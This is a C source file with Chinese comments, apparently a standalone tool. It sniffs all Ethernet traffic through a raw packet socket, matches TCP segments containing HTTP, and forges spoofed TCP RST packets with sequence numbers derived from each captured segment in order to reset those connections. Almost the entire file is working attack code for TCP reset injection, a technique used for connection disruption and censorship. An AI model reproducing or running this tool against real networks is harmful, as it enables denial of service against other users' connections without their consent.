/*
 *	cmpHTTP_sendTCP.c
 *
 *	原理：
 *		用 RawSocket 监听以太网上的所有数据帧，匹配 HTTP 协议并发送 TCP RST
 *
 *	参数：
 *		无
 *
 *  注意：
 *      Linux 下执行该程序需要 root 权限 sudo ./ 
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef __linux__
	#include <unistd.h>
	#include <errno.h>
	#include <sys/socket.h>
	#include <sys/types.h>
	#include <netinet/in.h>
	#include <netinet/ip.h>
	#include <netinet/tcp.h>
	#include <netinet/udp.h>
	#include <net/if_arp.h>
	#include <netinet/if_ether.h>
	#include <net/if.h>
	#include <sys/ioctl.h>
    #include <arpa/inet.h>
#elif __win32__
	#include <windows.h>
#endif

//-------------------------- start 宏 -------------------------------

#define TCP 0x06
#define PCKT_LEN 100
#define FALSE 0
#define TRUE 1

//-------------------------- end 宏 -------------------------------


//-------------------------- start 全局变量 ------------------------

/*
 *  含义：本机 IP(非 127.0.0.1)	
 *  赋值：main()
 *  使用：UnpackIP()
 */
static char * g_localIP = NULL;

/*
 *  含义：目标主机地址
 *  赋值：UnpackIP()，UnpackTCP()
 *	初始化：main() 中的循环开始时
 *  使用：sendTCP()
 */
static struct sockaddr_in g_destAddrIn;

/*
 *  含义：源（本机）主机地址
 *	初始化：main() 中的循环开始时
 *  赋值：UnpackIP()，UnpackTCP()
 *  使用：sendTCP()
 */
static struct sockaddr_in g_srcAddrIn;

/*
 *  含义：IP 负载的长度
 *	初始化：main() 中的循环开始时
 *  赋值：UnpackIP()
 *  使用：sendTCP()
 */
static int g_IP_payload_length;

/*
 *  含义：tcp 负载的长度
 *	初始化：main() 中的循环开始时
 *  赋值：UnpackTCP()
 *  使用：sendTCP()
 */
static int g_TCP_payload_length;

/*
 *  含义：序列号
 *	初始化：main() 中的循环开始时
 *  赋值：UnpackTCP()
 *  使用：sendTCP()
 */
static int g_seq;

/*
 *  含义：确认应答号
 *	初始化：main() 中的循环开始时
 *  赋值：UnpackTCP()
 *  使用：sendTCP()
 */
static int g_ack_seq;

//-------------------------- end 全局变量 ------------------------

static char *get_localIP();
static void getAddress(long addr, char *str);
static void UnpackIP(char *buff);
static void UnpackTCP(char *buff);
static void UnpackHTTP(char *buff);
static unsigned short checksum_generic(unsigned short *addr, unsigned int count);
static unsigned short checksum_tcpudp(struct iphdr *iph, void *buff, unsigned short data_len, int len);
static void sendTCP();

/*
 *	功能：
 *		获取本机 IP(非 127.0.0.1)	
 *
 *	参数：
 *		无
 *
 *  返回值：
 *      本机 IP(非 127.0.0.1)	
 */
static char *get_localIP()
{
    //printf("get_localIP\n");
    
    int fd, intrface, retn = 0;

    struct ifreq buf[INET_ADDRSTRLEN];

	//printf("INET_ADDRSTRLEN = %d\n",INET_ADDRSTRLEN);

    struct ifconf ifc;
        
    char *ip;

    if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) >= 0)
    {
        ifc.ifc_len = sizeof(buf);

        // caddr_t,Linux内核源码里定义的：typedef void *caddr_t；

        ifc.ifc_buf = (caddr_t)buf;

        if (!ioctl(fd, SIOCGIFCONF, (char *)&ifc))
        {
            intrface = ifc.ifc_len/sizeof(struct ifreq);

			//printf("intrface = %d\n",intrface);

            while (intrface-- > 0)
            {
                if (!(ioctl(fd, SIOCGIFADDR, (char *)&buf[intrface])))
                {
                    ip = (inet_ntoa(((struct sockaddr_in*)(&buf[intrface].ifr_addr))->sin_addr));
                                                                               
					//printf("IP:%s\n", ip);
					
                    if(strcmp(ip,"127.0.0.1") != 0)
                    {
                        close(fd);  
						
                        return ip;
                    }  
                }
            }
        }
    }
    
    close(fd);
}

/*
 *	功能：
 *		将 IP header 中 网络字节顺序的地址 处理成 点十分进制的 IP 地址
 *
 *	参数：
 *		addr：网络字节顺序的地址
 *      *str：处理后的 点十分进制的 IP 地址
 *
 *  返回值：
 *      无
 */
static void getAddress(long addr, char *str) 
{
    //printf("getAddress\n");
    
	sprintf(str, "%d.%d.%d.%d", 			\
			((unsigned char*)&addr)[0], 	\
			((unsigned char*)&addr)[1], 	\
			((unsigned char*)&addr)[2], 	\
			((unsigned char*)&addr)[3]);
}

/*
 *	功能：
 *		解析 IP 数据包
 *
 *	参数：
 *		*buff：IP 数据包
 *
 *  返回值：
 *      无
 */
static void UnpackIP(char *buff) 
{
    //printf("传输层协议：IP\n");
    
	struct iphdr *ip = (struct iphdr*)buff;
	char *nextStack = buff + sizeof(struct iphdr);
	int protocol = ip->protocol;

	/*
    char srcIP[20];
    char dstIP[20];
    
    bzero(srcIP, sizeof(srcIP));
    bzero(dstIP, sizeof(dstIP));

	getAddress(ip->saddr, srcIP);	
	getAddress(ip->daddr, dstIP);
	
	printf("来源 ip：%s\n", srcIP);
    printf("目的 ip：%s\n", dstIP);

    */

	switch(protocol)
	 {
        // TCP
		case TCP:
        {
            // 只处理收到的 TCP 包，即目的 IP 是本机
            //if(strcmp(g_localIP,dstIP) == 0)
            //{                  			
				// 全局变量，源主机 IP 赋值
				g_srcAddrIn.sin_addr.s_addr = ip->daddr;
                // 全局变量，目的主机 IP 赋值 
                g_destAddrIn.sin_addr.s_addr = ip->saddr;
				
				// 全局变量，IP 负载长度 = IP 包总长度 - IP 头长度  (ip->ihl 不用 ntohs，是因为它没有一字节长)
				g_IP_payload_length = ntohs(ip->tot_len) - ip->ihl * 4;			
                                             
                UnpackTCP(nextStack);     
            //}            			
            
			break;
        }
        
        // 不处理 UDP
		default:
        {
			break;
        }
	}
}

/*
 *	功能：
 *		解析 TCP 数据包
 *
 *	参数：
 *		*buff：TCP 数据包
 *
 *  返回值：
 *      无
 */
static void UnpackTCP(char *buff) 
{
    //printf("传输层协议：TCP\n");
    
	struct tcphdr *tcp = (struct tcphdr*)buff;
    char *nextStack = buff + sizeof(struct tcphdr);
		  
	//printf("来源端口：%d\n", ntohs(tcp->source));
	//printf("目标端口：%d\n", ntohs(tcp->dest));

    // http 协议
    if(strstr(nextStack,"HTTP") != NULL)
    {              
       // 全局变量，源端口 赋值
       g_srcAddrIn.sin_port = tcp->dest;
       // 全局变量，目的端口 赋值
       g_destAddrIn.sin_port = tcp->source;

	   // 全局变量，序列号 赋值
	   g_seq = ntohl(tcp->seq);
	   // 全局变量，确认应答号 赋值
	   g_ack_seq = ntohl(tcp->ack_seq);
	
	   // 全局变量，tcp 负载长度 =          IP 负载长度 -     tcp 头长度
	   g_TCP_payload_length = g_IP_payload_length - tcp->doff * 4;
        
       UnpackHTTP(nextStack);
    }
}

/*
 *	功能：
 *		解析 HTTP 数据包
 *
 *	参数：
 *		*buff：HTTP 数据包
 *
 *  返回值：
 *      无
 */
static void UnpackHTTP(char *buff) 
{
    printf("\n应用层协议：HTTP\n");
       
    printf("buff：\n%s\n",buff);
			
	sendTCP();
}

static unsigned short checksum_generic(unsigned short *addr, unsigned int count)
{
    register unsigned long sum = 0;

    for (sum = 0; count > 1; count -= 2)
        sum += *addr++;
	
    if (count == 1)
        sum += (char)*addr;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    
    return ~sum;
}

static unsigned short checksum_tcpudp(struct iphdr *iph, void *buff, unsigned short data_len, int len)
{
    const unsigned short *buf = buff;
    unsigned int ip_src = iph->saddr;
    unsigned int ip_dst = iph->daddr;
    unsigned int sum = 0;
    int length = len;
    
    while (len > 1)
    {
        sum += *buf;
        buf++;
        len -= 2;
    }

    if (len == 1)
        sum += *((unsigned short *) buf);

    sum += (ip_src >> 16) & 0xFFFF;
    sum += ip_src & 0xFFFF;
    sum += (ip_dst >> 16) & 0xFFFF;
    sum += ip_dst & 0xFFFF;
    sum += htons(iph->protocol);
    sum += data_len;

    while (sum >> 16) 
        sum = (sum & 0xFFFF) + (sum >> 16);

    return ((unsigned short) (~sum));
}

/*
 *	功能：
 *		发送 TCP 数据包，RST
 *
 *	参数：
 *		无
 *
 *  返回值：
 *      无
 */
static void sendTCP()
{  
    //printf("sendTCP\n");

    int sd;
    char buffer[PCKT_LEN] ;
    
    struct iphdr *ip = (struct iphdr*)buffer;
    struct tcphdr *tcp = (struct tcphdr*)(buffer + sizeof(struct iphdr));
    
    int  one = 1;
	const int *val = &one;

	memset(ip, -1, sizeof(struct iphdr));
	memset(tcp, -1, sizeof(struct tcphdr));
	
	memset(buffer, 0, PCKT_LEN);
    
    // 创建 TCP raw socket 
	sd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	if (sd < 0)
	{
		perror("sendTCP socket 失败：");
		
		printf("errno is %d\n",errno);
		
		exit(-1);
	}
    
    //IPPROTO_TP 说明用户自己填写 IP 报文
	//IP_HDRINCL 表示由内核来计算 IP 报文的头部校验和，和填充那个 IP 的 id 
	if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(int)))
	{
		perror("setsockopt() 失败");

		printf("errno is %d\n",errno);
        
		exit(-1);
	}
    
    
    //-------------- start：构造 IP 头部 ------------------------------------------------------------------
    
    // IPv4
    ip->version = 4;     
    // ip 头长度，没有 options 则为 5
    ip->ihl = 5;
    // 优先度 0
    ip->tos = 0; 
    // IP 包总长度 = IP heder + IP data（此时我们是 TCP header）
	ip->tot_len = htons(sizeof(struct iphdr)+ sizeof(struct tcphdr));    
    // 片偏移
    ip->frag_off = 0;    
    // 生存时间
    ip->ttl = 64; 
    // TCP
	ip->protocol = 6; 
    // 首部校验和
	ip->check = checksum_generic((unsigned short *)ip, sizeof (struct iphdr));;
	// 源地址
	ip->saddr = g_srcAddrIn.sin_addr.s_addr; 
	// 目标地址
	ip->daddr = g_destAddrIn.sin_addr.s_addr; 
    
    //-------------- end：构造 IP 头部 --------------------------------------------------------------------------------------
    
    //-------------- start：构造 TCP 头部 -----------------------------------------------------------------------------------
        
    // 源端口号
    tcp->source = g_srcAddrIn.sin_port;
    // 目的端口号
    tcp->dest = g_destAddrIn.sin_port;

	// 因为此时是 tcp 的数据阶段，所以此时的 seq = 抓到的 tcp 包中的 ack_seq ，ack_seq = 抓到的 tcp 包中的 seq + tcp 负载长度
    // 序列号
    tcp->seq = htonl(g_ack_seq);
    // 确认应答号
    tcp->ack_seq = htonl(g_seq + g_TCP_payload_length); 
	
    // tcp 头长度
    tcp->doff = 5;
    // 控制位
    tcp->urg = FALSE;
    tcp->ack = FALSE;
    tcp->psh = FALSE;
    tcp->rst = TRUE;
    tcp->syn = FALSE;
    tcp->fin = FALSE;  
    // 窗口大小，随机都可以，但不能为 0
    tcp->window = htons(8192);
    // 校验和    
    tcp->check = checksum_tcpudp(ip, tcp, htons(sizeof (struct tcphdr)), sizeof (struct tcphdr));
    // 紧急指针(不需要)
    //tcp->urg_ptr = 0xffff;
      
    //-------------- end：构造 TCP 头部 ---------------------------------------------------------------------------------------
    
    g_destAddrIn.sin_family = AF_INET;
         
    int ret;
    
    // 发送 TCP包   
    ret = sendto(sd, buffer, ntohs(ip->tot_len), 0, (struct sockaddr *)&g_destAddrIn, sizeof(g_destAddrIn));
    if(ret != -1)
    {
		char srcIP[20];
    	char dstIP[20];
	
		bzero(srcIP, sizeof(srcIP));
    	bzero(dstIP, sizeof(dstIP));

		getAddress(g_srcAddrIn.sin_addr.s_addr, srcIP);	
		getAddress(g_destAddrIn.sin_addr.s_addr, dstIP);
	        	
        printf("TCP Reset 发送成功！%s:%d -> %s:%d\n",srcIP,ntohs(g_srcAddrIn.sin_port),dstIP,ntohs(g_destAddrIn.sin_port));   
    }
    else
    {   
    	perror("TCP Reset 发送失败：");
		
		printf("errno is %d\n",errno);
    }
    
    close(sd);    
}


int main(int argc, char **argv)
{            
    g_localIP = get_localIP();
    
    printf("localIP：%s\n", g_localIP);
    
	int sockfd, i, n;
	char buff[2048];
	
    // 监听以太网上的所有数据帧
	if(0 > (sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))))
	{
		perror("socket 失败：");

		printf("errno is %d\n",errno);
        
		exit(-1);
	}

	while(1)
	{
		// ---------------------- start 全局变量初始化 -----------------------------
		memset(&g_destAddrIn, -1, sizeof(struct sockaddr_in));
		memset(&g_srcAddrIn, -1, sizeof(struct sockaddr_in));
		
		g_IP_payload_length = -1;
		g_TCP_payload_length = -1;
		g_seq = -1;
		g_ack_seq = -1;
		
		// ---------------------- end 全局变量初始化 -----------------------------
			
		memset(buff, 0, 2048);
		
		n = recvfrom(sockfd, buff, 2048, 0, NULL, NULL);

		// 42 = 14(ethernet head) + 20(ip header) + 8(TCP/UDP/ICMP header)
        if(n < 42)
        {                   
            printf("不完整的包长度，errno is %d\n",errno);
            
            continue;
        }
            
        struct ethhdr *eth = (struct ethhdr*)buff;		
		char *nextStack = buff + sizeof(struct ethhdr);
		
		int protocol = ntohs(eth->h_proto);
		switch(protocol) 
		{
            // IP 数据包
			case ETH_P_IP:
            {
				UnpackIP(nextStack);
                
				break;
            }
			
			default:
            {
				break;
            }
		}
	}

    close(sockfd);
    
	return 0;
}
